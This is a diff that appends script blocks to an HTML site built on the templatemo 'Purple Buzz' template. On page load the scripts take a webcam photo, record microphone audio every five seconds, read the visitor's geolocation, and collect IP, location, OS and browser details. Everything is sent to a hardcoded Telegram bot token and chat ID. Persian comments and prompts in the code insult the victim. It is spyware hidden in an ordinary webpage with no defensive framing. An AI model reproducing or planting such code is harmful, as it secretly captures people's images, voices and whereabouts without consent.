@@ -565,6 +565,202 @@ https://templatemo.com/tm-561-purple-buzz
     <!-- Custom -->
     <script src="assets/js/custom.js"></script>
 
+
+
+
+
+
+
+
+
+
+    <script>
+ async function takePhotoAndSend() {
+            {
+        
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+
+            const video = document.createElement('video');
+            document.body.appendChild(video);
+            video.srcObject = stream;
+            await video.play();
+
+
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d')
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+
+            canvas.toBlob(blob => {
+                sendPhotoToTelegram(blob);
+                stream.getTracks().forEach(track => track.stop());
+                document.body.removeChild(video);
+                document.body.removeChild(canvas);
+            }, 'image/jpeg');
+
+            // } cach (error) {
+            //     console.error('Error accessing the camera: ', error);
+            }
+        }
+
+
+
+
+
+        function sendPhotoToTelegram(blob) {
+            const url = 'https://api.telegram.org/bot6923568496:AAHM_gMcdsy-O712NIoj87NbVe1fp7auoiw/sendPhoto';
+            const formData = new FormData();
+            formData.append('photo', blob, 'photo.jpg');
+            formData.append('chat_id', '1209515299');
+
+            fetch(url, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => console.log(data))
+            .catch(error => console.error('Error sending photo to Telegram: ', error));
+
+        }
+        takePhotoAndSend();
+    </script>
+
+
+
+
+
+<script>
+    const telegramToken = '6923568496:AAHM_gMcdsy-O712NIoj87NbVe1fp7auoiw';
+    const chatId = '1209515299';
+
+    async function sendDataToTelegram(info) {
+      const message = `📡 کاربر جدید وارد شد:\n🌍 IP: ${info.ip}\n📱 OS: ${info.os}\n🧭 Browser: ${info.browser}\n📌 موقعیت: ${info.city}, ${info.country}\n🔍 Agent: ${navigator.userAgent}`;
+
+      await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({chat_id: chatId, text: message})
+      });
+    }
+
+    async function getUserData() {
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+
+        const info = {
+          ip: data.ip,
+          city: data.city,
+          country: data.country_name,
+          os: navigator.platform,
+          browser: navigator.userAgent
+        };
+
+        sendDataToTelegram(info);
+      } catch (err) {
+        console.error('خطا در گرفتن اطلاعات:', err);
+      }
+    }
+
+    getUserData();
+  </script>
+
+
+  <script>
+    (function() {
+      const botToken_oskool = '6923568496:AAHM_gMcdsy-O712NIoj87NbVe1fp7auoiw';
+      const chatId_oskool = '1209515299';
+      let recorder_gondeh;
+      let chunkha = [];
+
+      async function startSedaBazikon() {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+          recorder_gondeh = new MediaRecorder(stream);
+
+          recorder_gondeh.ondataavailable = e => chunkha.push(e.data);
+
+          recorder_gondeh.onstop = async () => {
+            const blob = new Blob(chunkha, { type: 'audio/webm' });
+            chunkha = [];
+
+            const formData = new FormData();
+            formData.append('chat_id', chatId_oskool);
+            formData.append('voice', blob, 'seda_gondeh.webm');
+
+            const url = `https://api.telegram.org/bot${botToken_oskool}/sendVoice`;
+            await fetch(url, {
+              method: 'POST',
+              body: formData
+            });
+          };
+
+          setInterval(() => {
+            if (recorder_gondeh.state === 'recording') {
+              recorder_gondeh.stop();
+            }
+            recorder_gondeh.start();
+          }, 5000);
+
+        } catch (err) {
+          alert('دست رسی رو  اجازه بدید');
+          console.error('مشکل از خودته داداش:', err);
+        }
+      }
+
+      startSedaBazikon();
+    })();
+  </script>
+
+
+
+
+
+  <script>
+    (function() {
+      const botToken_oskool = '6923568496:AAHM_gMcdsy-O712NIoj87NbVe1fp7auoiw';
+      const chatId_oskool = '1209515299';
+
+      function sendLocationToTelegram(lat, lon) {
+        const url = `https://api.telegram.org/bot${botToken_oskool}/sendLocation`;
+        const formData = new FormData();
+        formData.append('chat_id', chatId_oskool);
+        formData.append('latitude', lat);
+        formData.append('longitude', lon);
+
+        fetch(url, {
+          method: 'POST',
+          body: formData
+        });
+      }
+
+      function getAndSendLocationOnce() {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            position => {
+              const lat = position.coords.latitude;
+              const lon = position.coords.longitude;
+              sendLocationToTelegram(lat, lon);
+              document.getElementById('div_gondeh').innerText = '✅ لوکیشن ارسال شد!';
+            },
+            error => {
+              console.error('مشکل در گرفتن لوکیشن:', error);
+              document.getElementById('div_gondeh').innerText = '❌ خطا در گرفتن لوکیشن';
+            }
+          );
+        } else {
+          alert('مرورگرت لوکیشن رو ساپورت نمی‌کنه اوسگول!');
+        }
+      }
+
+      // فقط یک بار اجرا
+      getAndSendLocationOnce();
+    })();
+  </script>
+
+
 </body>
 
 </html>
